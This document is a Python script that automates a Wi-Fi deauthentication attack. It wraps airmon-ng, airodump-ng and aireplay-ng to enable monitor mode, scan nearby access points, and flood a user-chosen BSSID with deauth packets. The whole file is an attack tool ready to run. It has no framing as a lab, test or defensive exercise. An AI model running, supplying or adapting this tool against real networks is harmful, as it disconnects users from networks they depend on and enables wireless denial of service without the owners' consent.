import subprocess
import os
import signal

# Global Var
base_interface = input("[?] Enter the base interface name (e.g., wlan0): ")
monitor_interface = base_interface + "mon"

def enable_monitor_mode():
    """Enable monitor mode on the wireless interface."""
    print(f"[*] Enabling monitor mode on {base_interface}...")
    try:
        subprocess.run(["airmon-ng", "start", base_interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to enable monitor mode: {e}")
        exit(1)

def disable_monitor_mode():
    """Disable monitor mode and restore the interface to managed mode."""
    print(f"[*] Disabling monitor mode on {monitor_interface}...")
    try:
        subprocess.run(["airmon-ng", "stop", monitor_interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to disable monitor mode: {e}")

def handle_exit(signal_received, frame):
    """Handle script termination."""
    print("\n[!] Script interrupted. Cleaning up...")
    disable_monitor_mode()
    exit(0)

# Attach the SIGINT handler (Ctrl+C)
signal.signal(signal.SIGINT, handle_exit)

def scan_networks():
    """Scan for nearby networks using airodump-ng in a new terminal window."""
    print("[*] Scanning networks... This will open a new terminal to show nearby APs.")
    try:
        # Running airodump-ng in a new terminal window (use gnome-terminal or xfce4-terminal)
        subprocess.Popen(["xfce4-terminal", "--hold", "-e", f"airodump-ng {monitor_interface}"])
    except FileNotFoundError:
        print("[!] Terminal or airodump-ng not found. Install airodump-ng or change terminal emulator.")
        exit(1)

def set_channel(channel):
    """Set the wireless interface to a specific channel."""
    print(f"[*] Setting {monitor_interface} to channel {channel}...")
    try:
        subprocess.run(["iwconfig", monitor_interface, "channel", channel], check=True)
        print("[*] Channel set successfully.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to set channel: {e}")
        return False

def get_current_channel():
    """Retrieve the current channel of the wireless interface."""
    try:
        result = subprocess.run(["iwconfig", monitor_interface], capture_output=True, text=True, check=True)
        for line in result.stdout.splitlines():
            if "Channel" in line:
                return line.split("Channel")[-1].strip()
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to retrieve current channel: {e}")
        return None

def perform_deauth(bssid, channel, packet_count):
    """Perform a deauthentication attack."""
    # Verify the channel is correctly set
    current_channel = get_current_channel()
    if current_channel != channel:
        print(f"[!] Current channel ({current_channel}) does not match target channel ({channel}). Changing channel...")
        if not set_channel(channel):
            print("[!] Failed to change channel. Aborting attack.")
            return
        print(f"[*] Channel changed to {channel}. Continuing attack...")
    
    print(f"[*] Launching deauth attack on BSSID: {bssid} with {packet_count} packets...")
    try:
        # Execute aireplay-ng and capture output line by line
        process = subprocess.Popen(
            ["aireplay-ng", "--deauth", str(packet_count), "-a", bssid, monitor_interface],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        # Print each line of output in real-time
        for line in process.stdout:
            print(line.strip())
        
        process.wait()  # Wait for the process to complete
    except subprocess.CalledProcessError as e:
        print(f"[!] Error executing deauth attack: {e}")
        print(f"[!] Output: {e.output}")

def main():
    # Ensure monitor mode is enabled
    enable_monitor_mode()

    # Scan for networks
    scan_networks()
    input("\n[*] Press Enter when you're ready to continue...")

    # Collect user input for the deauth attack
    bssid = input("[?] Enter the target BSSID: ")
    channel = input("[?] Enter the target channel: ")
    packet_count = input("[?] Enter the number of deauth packets to send (default 10): ")
    packet_count = packet_count.strip() or "10"

    # Set the correct channel
    if not set_channel(channel):
        print("[!] Failed to set the channel. Exiting.")
        disable_monitor_mode()
        exit(1)

    # Perform the deauth attack
    perform_deauth(bssid, channel, packet_count)

    # Cleanup
    disable_monitor_mode()

if __name__ == "__main__":
    main()
